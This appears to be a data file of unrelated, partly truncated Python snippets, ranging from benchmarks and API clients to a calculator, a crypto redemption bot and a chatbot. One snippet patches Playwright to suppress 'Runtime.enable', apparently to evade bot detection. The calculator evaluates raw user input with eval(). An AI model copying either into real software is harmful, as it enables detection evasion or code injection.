@staticmethod\n    def areJoined( x,y):\n        return MySet.find(x) == MySet.find(y)\n\nclass RevListPuzzle:\n    def __init__(self,n) :\n        digits = [ x+1 for x in range(n)]\n        count = 0\n        self.n = n\n        self.nodes = []\n\n        for k in range(n):\n            ii = 0\n            for p in itertools.combinations(digits,k):\n                for p2 in itertools.permutations(p ):\n                    self.nodes.append(p2)\n          ",
    "from timeit import timeit\n\nimport matplotlib.pyplot as plt\n\nn = 1_000\n\n\ndef measure() -> dict[str, float]:\n    \"\"\"Measure times for popular levenshtein implementations.\n\n    Returns:\n        dict[str, float]: dict with measures, library name as key and measure as value.\n    \"\"\"\n    pylev_time = timeit(\n        \"pylev.levenshtein('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"import pylev\",\n        number=n,\n    )\n    # no longer actively mainted. See authors comment:\n    # https://github.com/lanl/pyxDamerauLevenshtein/issues/32#issuecomment-1249497449\n    # pyxdameraulevenshtein_time = timeit(\n    #     \"pyxdameraulevenshtein.damerau_levenshtein_distance(a, b)\", \"import pyxdameraulevenshtein\", number=n\n    # )\n    rapidfuzz_time = timeit(\n        \"Levenshtein.distance('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"from rapidfuzz.distance import Levenshtein\",\n        number=n,\n    )\n    editdistance_time = timeit(\n        \"editdistance.eval('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"import editdistance\",\n        number=n,\n    )\n    levenshtein_time = timeit(\n        \"Levenshtein.distance('Lets pretend Marshall Mathers never picked up a pen', 'Lets pretend things woulda been no different')\",\n        \"import Levenshtein\",\n        number=n,\n    )\n\n    return {\n        \"editdistance\": editdistance_time,\n        \"levenshtein\": levenshtein_time,\n        \"pylev\": pylev_time,\n        \"rapidfuzz\": rapidfuzz_time,\n    }\n\n\ndef plot(measures: dict[str, float]) -> None:\n    \"\"\"plot measures.\n\n    Args:\n        measures (dict[str, float]): dict with library name and measure\n    \"\"\"\n    fig, ax = plt.subplots()\n    ax.bar(measures.keys(), measures.values())\n    ax.set_xlabel(f\"Time in ms for n={n:,}\")\n    ax.set_title(\"Levenshtein distance w/o cut-off\")\n    plt.yscale(\"log\")\n    plt.savefig(\"bechmark_results.png\")\n\n\nif __name__ == \"__main__\":\n    measures = measure()\n    plot(measures)\n",
    "import asyncio, time\r\nfrom typing import AsyncIterator, Union, List\r\nfrom cog import BasePredictor, Input, ConcatenateIterator\r\n\r\nimport torch\r\nfrom vllm import AsyncLLMEngine\r\nfrom vllm.engine.arg_utils import AsyncEngineArgs\r\nfrom vllm.sampling_params import SamplingParams\r\nfrom vllm.utils import random_uuid\r\n\r\n# https://github.com/nateraw/replicate-examples/blob/main/mixtral-vllm/predict.py modified\r\nclass VLLMPipeline:\r\n    \"\"\"\r\n    A simplified inference engine that runs inference w/ vLLM\r\n    \"\"\"\r\n\r\n    def __init__(self, *args, **kwargs) -> None:\r\n        args = AsyncEngineArgs(*args, **kwargs)\r\n        self.engine = AsyncLLMEngine.from_engine_args(args)\r\n        self.tokenizer = (\r\n            self.engine.engine.tokenizer.tokenizer\r\n            if hasattr(self.engine.engine.tokenizer, \"tokenizer\")\r\n            else self.engine.engine.tokenizer\r\n        )\r\n\r\n    async def generate_stream(\r\n        self, prompt: str, sampling_params: SamplingParams\r\n    ) -> AsyncIterator[str]:\r\n        results_generator = self.engine.generate(\r\n            prompt, sampling_params, str(random_uuid())\r\n            )\r\n        async for generated_text in results_generator:\r\n            yield generated_text\r\n\r\n    def __call__(\r\n        self,\r\n        prompt: str,\r\n        max_tokens: int,\r\n        min_tokens: int,\r\n        presence_penalty: float,\r\n        frequency_penalty: float,\r\n        repetition_penalty: float,\r\n        length_penalty: float,\r\n        temperature: float,\r\n        top_p: float,\r\n        top_k: int,\r\n        min_p: float,\r\n        ignore_eos: bool,\r\n        stop_sequences: Union[str, List[str]] = None,\r\n        stop_token_ids: List[int] = None,\r\n        incremental_generation: bool = True,\r\n    ) -> str:\r\n        \"\"\"\r\n        Given a prompt, runs generation on the language model with vLLM.\r\n        \"\"\"\r\n\r\n        if top_k is None or top_k == 0:\r\n            top_k = -1\r\n\r\n        stop_token_ids = stop_token_ids or []\r\n        stop_token_ids.append(self.tokenizer.eos_token_id)\r\n\r\n        if isinstance(stop_sequences, str) and stop_sequences != \"\":\r\n            stop = [stop_sequences]\r\n        elif isinstance(stop_sequences, list) and len(stop_sequences) > 0:\r\n            stop = stop_sequences\r\n        else:\r\n            stop = []\r\n\r\n        for tid in stop_token_ids:\r\n            stop.append(self.tokenizer.decode(tid))\r\n\r\n        sampling_params = SamplingParams(n=1, \r\n                                        best_of=None,\r\n                                        presence_penalty=presence_penalty, \r\n                                        frequency_penalty=frequency_penalty, \r\n                                        repetition_penalty=repetition_penalty, \r\n                                        temperature=temperature, \r\n                                        top_p=top_p, \r\n                                        top_k=top_k,\r\n                                        min_p=min_p,\r\n                                        seed=None,\r\n                                        use_beam_search=False,\r\n                                        length_penalty=length_penalty,\r\n                                        early_stopping=False,\r\n                                        stop=stop,\r\n                                        # stop_token_ids=None,\r\n                                        include_stop_str_in_output=False,\r\n                                        ignore_eos=ignore_eos,\r\n                                        max_tokens=max_tokens,\r\n                                        min_tokens=min_tokens,\r\n                                        logprobs=None,\r\n                                        prompt_logprobs=None,\r\n                                        skip_special_tokens=True,\r\n                                        spaces_between_special_tokens=True,\r\n                                        logits_processors=None\r\n        )\r\n\r\n        try:\r\n            loop = asyncio.get_event_loop()\r\n        except RuntimeError:\r\n            loop = asyncio.new_event_loop()\r\n            asyncio.set_event_loop(loop)\r\n\r\n        gen = self.generate_stream(\r\n            prompt,\r\n            sampling_params,\r\n        )\r\n\r\n        generation_length = 0\r\n\r\n        while True:\r\n            try:\r\n                request_output = loop.run_until_complete(gen.__anext__())\r\n                assert len(request_output.outputs) == 1\r\n                generated_text = request_output.outputs[0].text\r\n                if incremental_generation:\r\n                    yield generated_text[generation_length:]\r\n                else:\r\n                    yield generated_text\r\n                generation_length = len(generated_text)\r\n            except StopAsyncIteration:\r\n                break\r\n\r\nclass Predictor(BasePredictor):\r\n    def setup(self) -> None:\r\n        n_gpus = torch.cuda.device_count()\r\n        start = time.time()\r\n        print(f\"downloading weights took {time.time() - start:.3f}s\")\r\n        self.llm = VLLMPipeline(\r\n     ",
    "import os\nimport streamlit as st\nimport altair as alt\nfrom contextlib import contextmanager, redirect_stdout\nfrom io import StringIO\nimport gurobipy as gp\nimport highspy\nimport pyscipopt\nimport mip\nimport pandas as pd\nimport time\n\n\ndef run_cbc(model: str, timelimit: int):\n\n    m = mip.Model(solver_name=mip.CBC)\n\n    m.read(model)\n    start = time.time()\n    status = m.optimize(max_seconds=timelimit)\n    end = time.time()\n\n    return {\n        \"solver\": \"CBC\",\n        \"time\": end-start,\n        \"iterations\": None,\n        \"nodes\": None,\n        \"gap\": m.gap,\n        \"objective\": m.objective_value,\n        \"status\": status,\n    }\n\n\ndef run_highs(model: str, timelimit: int):\n\n    h = highspy.Highs()\n\n    # Solve from mps file\n    h.readModel(model)\n    h.setOptionValue(\"time_limit\", timelimit)\n    if os.path.exists(\"highs.log\"):\n        os.remove(\"highs.log\")\n    h.setOptionValue(\"log_file\", \"highs.log\")\n\n    h.run()\n\n    info = h.getInfo()\n    version = []\n    version.append(highspy.HIGHS_VERSION_MAJOR)\n    version.append(highspy.HIGHS_VERSION_MINOR)\n    version.append(highspy.HIGHS_VERSION_PATCH)\n\n    return {\n        \"solver\": f\"HiGHS {version[0]}.{version[1]}.{version[2]}\",\n        \"time\": h.getRunTime(),\n        \"iterations\": info.simplex_iteration_count,\n        \"nodes\": info.mip_node_count,\n        \"gap\": info.mip_gap,\n        \"objective\": info.objective_function_value,\n        \"status\": h.modelStatusToString(h.getModelStatus()),\n    }\n\n\ndef run_pyscipopt(model: str, timelimit: int):\n\n    m = pyscipopt.Model()\n    m.redirectOutput()\n    m.printVersion()\n    m.readProblem(model)\n\n    m.setParam(\"limits/time\", timelimit)\n\n    m.optimize()\n\n    try:\n        objval = m.getObjVal()\n    except:\n        objval = None\n\n    return {\n        \"solver\": f\"SCIP {m.version()}\",\n        \"time\": m.getTotalTime(),\n        \"iterations\": m.getNLPIterations(),\n        \"nodes\": m.getNNodes(),\n        \"gap\": m.getGap(),\n        \"objective\": objval,\n        \"status\": m.getStatus(),\n    }\n\n\ndef run_gurobi(model: str, timelimit: int):\n\n    with gp.Env() as env:\n        m = gp.read(model, env=env)\n\n        m.Params.TimeLimit = timelimit\n\n        m.optimize()\n\n        statuscodes = {\n            1: \"LOADED\",\n            2: \"OPTIMAL\",\n            3: \"INFEASIBLE\",\n            4: \"INF_OR_UNBD\",\n            5: \"UNBOUNDED\",\n            6: \"CUTOFF\",\n            7: \"ITERATION_LIMIT\",\n            8: \"NODE_LIMIT\",\n            9: \"TIME_LIMIT\",\n            10: \"SOLUTION_LIMIT\",\n            11: \"INTERRUPTED\",\n            12: \"NUMERIC\",\n            13: \"SUBOPTIMAL\",\n            14: \"INPROGRESS\",\n            15: \"USER_OBJ_LIMIT\",\n            16: \"WORK_LIMIT\",\n            17: \"MEM_LIMIT\",\n        }\n\n        try:\n            gap = m.MIPGap\n        except:\n            gap = None\n\n        try:\n            objval = m.ObjVal\n        except:\n            objval = None\n\n        version = gp.gurobi.version()\n\n        return {\n            \"solver\": f\"Gurobi {version[0]}.{version[1]}.{version[2]}\",\n            \"iterations\": m.IterCount,\n            \"nodes\": m.NodeCount,\n            \"objective\": objval,\n            \"gap\": gap,\n            \"time\": m.Runtime,\n            \"status\": statuscodes[m.Status],\n    }\n\n\n@contextmanager\ndef st_capture(output_func):\n    with StringIO() as stdout, redirect_stdout(stdout):\n        old_write = stdout.write\n\n        def new_write(string):\n            ret = old_write(string)\n            output_func(stdout.getvalue())\n            return ret\n\n        stdout.write = new_write\n        yield\n\n\n# parse arguments and pass to functions\nif __name__ == \"__main__\":\n    st.image(\n        \"https://raw.githubusercontent.com/Gurobi/.github/main/img/gurobi-light.png\"\n    )\n    st.header(\"Benchmarking Gurobi and open-source solvers\")\n    model = st.file_uploader(\"Choose a model file\", type=[\"mps\", \"lp\"])\n\n    with st.form(\"Run\"):\n        if model is not None:\n            with open(model.name, \"wb\") as f:\n                f.write(model.getvalue())\n\n            st.write(f'File \"{model.name}\" has been uploaded successfully!')\n        \n        timelimit = st.slider(\"time limit in seconds\", 1, 60)\n        solvers = st.multiselect(\"Select solvers to compare:\", [\"Gurobi\", \"HiGHS\", \"SCIP\", \"CBC\"], [\"Gurobi\", \"HiGHS\", \"SCIP\", \"CBC\"])\n        submitted = st.form_submit_button(\"Run!\")\n        tabs = st.tabs([\"Results\"] + solvers)\n        if submitted:\n            results_list = []\n            progress_bar = st.progress(0, \"Progress\")\n            progress_bar.progress(0)\n            with st.spinner(\"Optimizing...\"):\n                for i,s in enumerate(solvers):\n                    progress_bar.progress((i)/len(solvers))\n                    if s == \"Gurobi\":\n                        with tabs[i+1]:\n                            output1 = st.empty()\n                            with st_capture(output1.code):\n                                results_list.append(run_gurobi(model.name, timelimit))\n                    if s == \"HiGHS\":\n                        with",
    "import base64\nimport re\nfrom datetime import date, datetime\nfrom io import StringIO\n\nimport pandas as pd\nimport requests\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import padding\nfrom cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey\n\n\ndef sign_request_id(req_id: str, private_key: RSAPrivateKey) -> str:\n    req_id_bytes = req_id.encode()\n    signature = private_key.sign(req_id_bytes, padding.PKCS1v15(), hashes.SHA256())\n    signature_base64 = base64.b64encode(signature)\n    return signature_base64.decode()\n\n\ndef get_date_and_time(dt_str: str) -> tuple[str, str]:\n    dt_obj = datetime.strptime(dt_str, \"%Y-%m-%dT%H:%M:%S.%fZ\")\n    date_obj = dt_obj.date()\n    time_obj = dt_obj.time()\n    date_str = date_obj.strftime(\"%d-%m-%Y\")\n    time_str = time_obj.strftime(\"%H:%M:%S\")\n    return date_str, time_str\n\n\nclass WiseApi:\n    UUID_REGEX = r\"(^[0-9a-fA-F]{8}\\b-[0-9a-fA-F]{4}\\b-[0-9a-fA-F]{4}\\b-[0-9a-fA-F]{4}\\b-[0-9a-fA-F]{12}$)\"\n\n    def __init__(\n        self, api_token: str, private_key_bytes: bytes, use_sandbox: bool = False\n    ):\n        if not re.match(self.UUID_REGEX, api_token):\n            raise ValueError(\"Invalid API token\")\n        self.api_token = api_token\n        self.private_key = serialization.load_pem_private_key(\n            private_key_bytes, password=None, backend=default_backend()\n        )\n        self.session = requests.Session()\n        self.session.headers = {\n            \"Authorization\": f\"Bearer {self.api_token}\",\n            \"Content-Type\": \"application/json\",\n        }\n\n        if use_sandbox:\n            self.url_prefix = \"https://api.sandbox.transferwise.tech\"\n        else:\n            self.url_prefix = \"https://api.transferwise.com\"\n\n    def get_profiles(self) -> list[dict]:\n        response = self.session.get(f\"{self.url_prefix}/v2/profiles\")\n        if not response.ok:\n            raise ValueError(\"Failed to get profiles. Check private key.\")\n        return response.json()\n\n    def get_profile_data(self, selected_account_type: str) -> list[dict]:\n        wise_profiles = self.get_profiles()\n        profile_data_list = [\n            acc for acc in wise_profiles if acc[\"type\"] == selected_account_type\n        ]\n        if len(profile_data_list) == 0:\n            raise ValueError(\"No business account found.\")\n        return profile_data_list\n\n    def get_balances(self, profile_id: int, jar: bool = False) -> list[dict]:\n        if jar:\n            response = self.session.get(\n                f\"{self.url_prefix}/v4/profiles/{profile_id}/balances?types=SAVINGS\",\n            )\n        else:\n            response = self.session.get(\n                f\"{self.url_prefix}/v4/profiles/{profile_id}/balances?types=STANDARD\",\n            )\n        if not response.ok:\n            raise ValueError(f\"{response}\")\n        return response.json()\n\n    def get_eur_balance_dict(\n        self, profile_id: int, currency: str, jar: bool = False\n    ) -> tuple[dict | list, int | None]:\n        all_balances = self.get_balances(profile_id=profile_id, jar=jar)\n        eur_balances = [\n            balance for balance in all_balances if balance[\"currency\"] == currency\n        ]\n        if len(eur_balances) > 1:\n            raise ValueError(\n                \"More than one EUR balance found. The first account is displayed.\"\n            )\n        if eur_balances:\n            eur_balance = eur_balances[0]\n            balance_id = eur_balance[\"id\"]\n        else:\n            eur_balance = eur_balances  # type: ignore\n            balance_id = None\n        return eur_balance, balance_id\n\n    def get_statement_df(\n        self, profile_id: int, balance_id: int, start_date: date, end_date: date\n    ) -> pd.DataFrame:\n        params = (\n            f\"intervalStart={start_date.strftime('%Y-%m-%d')}T00:00:00.000Z&\"\n            f\"intervalEnd={end_date.strftime('%Y-%m-%d')}T23:59:59.999Z&type=COMPACT\"\n        )\n        response = self.session.get(\n            f\"{self.url_prefix}/v1/profiles/{profile_id}/balance-statements\"\n            f\"/{balance_id}/statement.csv\",\n            params=params,\n        )\n        if \"x-2fa-approval\" in response.headers:\n            req_id = response.headers[\"x-2fa-approval\"]\n            req_signature = sign_request_id(req_id=req_id, private_key=self.private_key)  # type: ignore\n            self.session.headers[\"x-2fa-approval\"] = req_id\n            self.session.headers[\"X-Signature\"] = req_signature\n            response = self.session.get(\n                f\"{self.url_prefix}/v1/profiles/{profile_id}/balance-statements\"\n                f\"/{balance_id}/statement.csv\",\n                params=params,\n                stream=False,\n            )\n        if not response.ok:\n            raise ValueError(\n                f\"Failed to get statement (Response: {response}).  Check private key. \"\n            )\n        if \"x-2fa-approval\" in self.session.headers:\n         ",
    "# Author: Diogo Costa\n# Date: 2024-04-16\n# Description: Calculator with graphical interface\n\n# tkinter library\nimport tkinter as tk\n\n\n# Functions for mathematical operations\ndef sum():\n    try:\n        total = eval(entry.get())\n        result.config(text=str(total))\n    except:\n        result.config(text=\"Invalid input\")\n\n\n# Calculator interface\nroot = tk.Tk()\nroot.title(\"Calculator\")\nroot.geometry(\"225x342\")\n# root.resizable(False, False)\nroot.configure(background=\"white\")\nroot.attributes(\"-alpha\", 0.97, \"-topmost\", True)\n\n# Title label\nlabel = tk.Label(\n    root,\n    text=\"Calculator\",\n    foreground=\"#444\",\n    background=\"#f7f7f7\",\n    height=2,\n    width=14,\n    font=(\"Segoe UI\", 20, \"bold\"),\n    borderwidth=1,\n    relief=\"raised\"\n)\nlabel.grid(row=0, column=0, columnspan=5, pady=0, padx=0)\n\n# Entry field for numbers and operations\nentry = tk.Entry(\n    root,\n    justify='center',\n    width=25,\n    font=(\"Segoe UI\", 12),\n    background=\"#f9f9f9\",\n    foreground=\"black\",\n    borderwidth=1,\n    relief=\"groove\",\n)\nentry.grid(row=1, column=0, columnspan=10, ipady=0, ipadx=0, pady=0, padx=0)\n\n# Result of the calculation\nresult = tk.Label(\n    root,\n    text=\"\",\n    justify='center',\n    font=(\"Segoe UI\", 19, \"bold\"),\n    foreground=\"black\",\n    background=\"white\",\n    borderwidth=1,\n    relief=\"groove\",\n    width=15\n)\nresult.grid(row=2, column=0, columnspan=4, pady=0, padx=0, ipady=0, ipadx=0)\n\n# Menu bar\nmode_var = tk.IntVar()\nmode_var.set(1)\nmenu = tk.Menu(root)\nroot.config(menu=menu)\nfile_menu = tk.Menu(menu, tearoff=0)\nmenu.add_cascade(label=\"Mode\", menu=file_menu)\nfile_menu.add_radiobutton(label=\"Standard\", variable=mode_var, value=1)\nfile_menu.add_radiobutton(label=\"Scientific\", variable=mode_var, value=2)\nfile_menu.add_radiobutton(label=\"Programmer\", variable=mode_var, value=3)\n\n# Buttons for operations\nbuttons = [\n    ('C', 4, 0), ('%', 4, 1), ('/', 4, 2), ('x', 4, 3),\n    ('7', 5, 0), ('8', 5, 1), ('9', 5, 2), ('-', 5, 3),\n    ('4', 6, 0), ('5', 6, 1), ('6', 6, 2), ('+', 6, 3),\n    ('1', 7, 0), ('2', 7, 1), ('3', 7, 2), ('=', 7, 3),\n    ('0', 8, 0), ('.', 8, 1), ('\u232b', 8, 2)\n]\n\nfor (text, row, column) in buttons:\n    button = tk.Button(\n        root,\n        text=text,\n        font=(\"opensans\", 14, \"bold\"),\n        foreground=\"#222\",\n        background=\"grey\",\n        width=3,\n        height=0,\n        command=lambda t=text: on_button_click(t),\n        borderwidth=1,\n        relief=\"groove\",\n        highlightbackground=\"gray\",\n        highlightthickness=1\n    )\n    if text == '=':\n        button.config(width=3, height=3)\n        button.grid(row=row, column=column, padx=0, pady=0, rowspan=2, columnspan=2)\n    else:\n        button.grid(row=row, column=column, padx=0, pady=1)\n\n\n# Function for button clicks\ndef on_button_click(value):\n    if value == '=':\n        try:\n            result.config(text=str(eval(entry.get())))\n        except:\n            result.config(text=\"Error\")\n    elif value == 'C':\n        entry.delete(0, tk.END)\n        result.config(text=\"\")\n    elif value == '\u232b':\n        entry.delete(len(entry.get()) - 1, tk.END)\n    elif value == '%':\n        entry.insert(tk.END, '/100')\n    elif value == 'x':\n        entry.insert(tk.END, '*')\n    elif value == '\u00f7':\n        entry.insert(tk.END, '/')\n    else:\n        entry.insert(tk.END, value)\n\n\nroot.mainloop()",
    "import sys\nimport re\nimport os\n\ndef is_patched(file_path: str) -> bool:\n    try:\n        with open(file_path, \"r\") as f:\n            content = f.read()\n            if \"/*Patched By NayutaTeam*/\" in content:\n                return True\n    except FileNotFoundError:\n        pass\n    return False\n\ndef patch_driver(path: str):\n    try:\n        # patch driver\n        print(f'[PATCH] patching driver for \"{path}\"', file=sys.stderr)\n\n        def replace(path: str, old_str: str, new_str: str):\n            try:\n                with open(path, \"r\") as f:\n                    content = f.read()\n                content = content.replace(old_str, new_str)\n                with open(path, \"w\") as f:\n                    f.write(content)\n                print(f'Patch applied to {path}')\n            except Exception as e:\n                print(f'Error patching {path}: {e}', file=sys.stderr)\n\n        server_path = os.path.join(path, \"package\", \"lib\", \"server\")\n        chromium_path = os.path.join(server_path, \"chromium\")\n\n        # comment out all \"Runtime.enable\" occurrences\n        cr_devtools_path = os.path.join(chromium_path, \"crDevTools.js\")\n        if not is_patched(cr_devtools_path):\n            replace(cr_devtools_path, \"session.send('Runtime.enable'),\", \"/*session.send('Runtime.enable'), */\")\n\n        cr_page_path = os.path.join(chromium_path, \"crPage.js\")\n        if not is_patched(cr_page_path):\n            with open(cr_page_path, \"r\") as f:\n                cr_page = f.read()\n                cr_page = cr_page.replace(\"this._client.send('Runtime.enable', {}),\",\n                                          \"/*this._client.send('Runtime.enable', {}),*/\")\n                cr_page = cr_page.replace(\"session._sendMayFail('Runtime.enable');\",\n                                          \"/*session._sendMayFail('Runtime.enable');*/\")\n            with open(cr_page_path, \"w\") as f:\n                f.write(cr_page)\n            print(f'Patch applied to {cr_page_path}')\n\n        cr_sv_worker_path = os.path.join(chromium_path, \"crServiceWorker.js\")\n        if not is_patched(cr_sv_worker_path):\n            replace(cr_sv_worker_path, \"session.send('Runtime.enable', {}).catch(e => {});\",\n                    \"/*session.send('Runtime.enable', {}).catch(e => {});*/\")\n\n        # patch ExecutionContext eval to still work\n        frames_path = os.path.join(server_path, \"frames.js\")\n\n        _context_re = re.compile(r\".*\\s_context?\\s*\\(world\\)\\s*\\{(?:[^}{]+|\\{(?:[^}{]+|\\{[^}{]*\\})*\\})*\\}\")\n        _context_replacement = \\\n            \" async _context(world) {\\n\" \\\n            \"\"\"\n            // atm ignores world_name\n            if (this._isolatedContext == undefined) {\n              var worldName = \"utility\"\n              var result = await this._page._delegate._mainFrameSession._client.send('Page.createIsolatedWorld', {\n                frameId: this._id,\n                grantUniveralAccess: true,\n                worldName: worldName\n              });\n              var crContext = new _crExecutionContext.CRExecutionContext(this._page._delegate._mainFrameSession._client, {id:result.executionContextId})\n              this._isolatedContext = new _dom.FrameExecutionContext(crContext, this, worldName)\n            }\n            return this._isolatedContext\n            \\n\"\"\" \\\n            \"}\"\n        clear_re = re.compile(\n            r\".\\s_onClearLifecycle?\\s*\\(\\)\\s*\\{\")\n        clear_repl = \\\n            \" _onClearLifecycle() {\\n\" \\\n            \"\"\"\n            this._isolatedContext = undefined;\n            \"\"\"\n\n        if not is_patched(frames_path):\n            with open(frames_path, \"r\") as f:\n                frames_js = f.read()\n                frames_js = \"var _crExecutionContext = require('./chromium/crExecutionContext')\\n\" \\\n                            \"var _dom =  require('./dom')\\n\" \\\n                            + \"\\n\" + frames_js\n\n                # patch _context function\n                frames_js = _context_re.subn(_context_replacement, frames_js, count=1)[0]\n                frames_js = clear_re.subn(clear_repl, frames_js, count=1)[0]\n\n            with open(frames_path, \"w\") as f:\n                f.write(frames_js)\n            print(f'Patch applied to {frames_path}')\n\n        # Add patch marker to patched files\n        for patched_file in [cr_devtools_path, cr_page_path, cr_sv_worker_path, frames_path]:\n            if not is_patched(patched_file):\n                with open(patched_file, \"a\") as f:\n                    f.write(\"\\n/*Patched By NayutaTeam*/\")\n                    print(f'Patch marker added to {patched_file}')\n\n    except Exception as e:\n        print(f'Error: {e}', file=sys.stderr)\n\ndef main(path: str = \"\"):\n    try:\n        if not path:\n            path = \".\\\\.playwright\"\n        if not os.path.exists(path):\n            print(f\"Error: Path '{path}' does not exist.\")\n            return\n        patch_driver(path)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        pa",
    "from web3 import Web3, HTTPProvider\nfrom web3.contract import Contract\nfrom datetime import datetime\nimport HP_ERC20\nimport esXai\nimport time\nimport sys\nimport schedule\n\nw3: Web3\ntoken_contract: Contract\naccount_address: str\naccount_private_key: str\nredeemption_time: int\n\nredeemption_address = Web3.to_checksum_address(esXai.esXai_redeemption_contract_address)\ntoken_contract_address = Web3.to_checksum_address(esXai.contract_address)\n\ndef redeem(balance):\n    tokens_to_redeem = w3.to_wei(balance, 'ether')\n    redeem_contract = w3.eth.contract(address=redeemption_address, abi=esXai.esXai_redeemption_contract_abi)\n    gas_price = w3.to_wei(20, 'gwei')\n    tx = redeem_contract.functions.startRedemption(tokens_to_redeem, redeemption_time).build_transaction({\n    'chainId': 42161,\n    'gas': 200000,\n    'gasPrice': gas_price,\n    'nonce': w3.eth.get_transaction_count(Web3.to_checksum_address(account_address))\n    })\n    signed_tx = w3.eth.account.sign_transaction(tx, account_private_key)\n    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)\n    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)\n    if receipt.status:\n        print(f\"The transaction was successful {balance} esXai send to redeem contract\")\n    else:\n        print(\"Trx failed. will retry later\")\n\ndef checkAll():\n    token_balance = HP_ERC20.check_token_balance(w3, Web3.to_checksum_address(account_address), token_contract_address, esXai.esXai_contract_abi)\n    current_datetime = datetime.now()\n    print(f'balance of tokens on acc {account_address}: {token_balance}, time: {current_datetime.strftime(\"%d.%m.%Y, %H:%M\")}')\n    balance_in_ethers = w3.from_wei(token_balance, 'ether')\n    if balance_in_ethers > 1:\n        truncated_balance = int(balance_in_ethers)\n        redeem(truncated_balance)\n\nif __name__ == \"__main__\":\n    account_address = input(\"input your address: \")\n    account_private_key = input(\"input your private key: \")\n    redeemption_time = int(input(\"enter redeemption rate in seconds - 180(15552000), 90(7776000), 15(1296000) : \"))\n    if not redeemption_time == 15552000 or redeemption_time == 7776000 or redeemption_time == 1296000:\n        print(\"wrong redeemption rate!\")\n        sys.exit()\n    w3 = Web3(HTTPProvider('https://1rpc.io/arb'))\n    token_contract = w3.eth.contract(address=token_contract_address, abi=esXai.esXai_contract_abi)\n    schedule.every().hour.do(checkAll)\n    while True:\n        schedule.run_pending()\n        time.sleep(1)",
    "_base_ = [\n    '../_base_/models/hv_pointpillars_fpn_range100_lyft.py',\n    '../_base_/datasets/range100_lyft-3d.py',\n    '../_base_/schedules/schedule_2x.py', '../_base_/default_runtime.py'\n]\n# model settings\nmodel = dict(\n    pts_neck=dict(\n        _delete_=True,\n        type='SECONDFPN',\n        norm_cfg=dict(type='naiveSyncBN2d', eps=1e-3, momentum=0.01),\n        in_channels=[64, 128, 256],\n        upsample_strides=[1, 2, 4],\n        out_channels=[128, 128, 128]),\n    pts_bbox_head=dict(\n        in_channels=384,\n        feat_channels=384,\n        anchor_generator=dict(\n            _delete_=True,\n            type='AlignedAnchor3DRangeGenerator',\n            ranges=[[-100, -100, -1.0715024, 100, 100, -1.0715024],\n                    [-100, -100, -0.3033737, 100, 100, -0.3033737],\n                    [-100, -100, -0.3519405, 100, 100, -0.3519405],\n                    [-100, -100, -0.8871424, 100, 100, -0.8871424],\n                    [-100, -100, -0.6276341, 100, 100, -0.6276341],\n                    [-100, -100, -1.3220503, 100, 100, -1.3220503],\n                    [-100, -100, -1.0709302, 100, 100, -1.0709302],\n                    [-100, -100, -0.9122268, 100, 100, -0.9122268],\n                    [-100, -100, -1.8012227, 100, 100, -1.8012227]],\n            sizes=[\n                [4.75, 1.92, 1.71],  # car\n                [10.24, 2.84, 3.44],  # truck\n                [12.70, 2.92, 3.42],  # bus\n                [6.52, 2.42, 2.34],  # emergency vehicle\n                [8.17, 2.75, 3.20],  # other vehicle\n                [2.35, 0.96, 1.59],  # motorcycle\n                [1.76, 0.63, 1.44],  # bicycle\n                [0.80, 0.76, 1.76],  # pedestrian\n                [0.73, 0.35, 0.50]  # animal\n            ],\n            rotations=[0, 1.57],\n            reshape_out=True)))\n",
    "class ColorChannelOffset:\n    @classmethod\n    def INPUT_TYPES(s):\n        return {\"required\": { \"colorChannel\": (\"INT\", {\"default\": 0, \"min\": 0, \"max\": 3}),\n                              \"x\": (\"FLOAT\", {\"default\": 0, \"min\": -1, \"max\": 1, \"step\": 0.05}),\n                              \"y\": (\"FLOAT\", {\"default\": 0, \"min\": -1, \"max\": 1, \"step\": 0.05}),\n                              }}\n\n    RETURN_TYPES = (\"SHADER\", \"FLOAT\")\n    CATEGORY = \"Shader\"\n    FUNCTION = \"shader\"\n\n    def shader_text(self, channel: int, x: float, y: float):\n        return f\"\"\"\n        // Uniforms\n        uniform vec2 offset = vec2(0, 0);\n        uniform float colorChannel = 0;\n\n        void mainImage(out vec4 fragColor, in vec2 fragCoord)\n        {{\n            vec2 texCoord = fragCoord.xy / iResolution.xy;\n            fragColor = texture(iChannel0, texCoord);\n            int channel = int(colorChannel);\n            fragColor[channel] = texture(iChannel0, texCoord - offset)[channel];\n        }}\n        \"\"\"\n\n    def shader(self, colorChannel:int, x: float, y: float):\n        source = self.shader_text(colorChannel, x, y)\n        return (source,x)\n",
    "import openai\r\nimport threading\r\nimport time\r\n# Set up OpenAI API with your API key\r\n# openai.api_key = \"\"\r\nimport google.generativeai as genai\r\nimport os\r\nfrom google.cloud import dialogflow_v2 as dialogflow\r\n\r\n\r\n# Define the mental health support function\r\n\r\nimport time\r\n\r\ndef print_slowly(text, delay=0.05):\r\n    \"\"\"Function to print text slowly with a delay between each character.\"\"\"\r\n    for char in text:\r\n        # Use the built-in print function instead of calling print_slowly recursively.\r\n        print(char, end='', flush=True)\r\n        time.sleep(delay)\r\n    # Print a newline at the end to keep output tidy.\r\n    print()\r\n\r\n# Now, you can use the function without encountering the recursion issue.\r\n  # Newline after print_slowlying the whole text\r\n\r\ndef get_mental_health_support(user_input):\r\n    if user_input.lower() == \"hi\":\r\n        return \"Hello! I'm here to provide mental health support. How can I help you today?\"\r\n    \r\n    if \"stress\" in user_input.lower():\r\n        return (\r\n            \"It sounds like you're experiencing stress. I'm here to help.\"\r\n            \"\\n- Would you like some breathing exercises?\"\r\n            \"\\n- Or would you like me to share some resources on stress management?\"\r\n        )\r\n    \r\n    if \"anxiety\" in user_input.lower():\r\n        return (\r\n            \"It sounds like you're experiencing anxiety. I'm here to help.\"\r\n            \"\\n- Would you like some grounding techniques?\"\r\n            \"\\n- Or would you like me to share resources on managing anxiety?\"\r\n        )\r\n    \r\n    if \"depression\" in 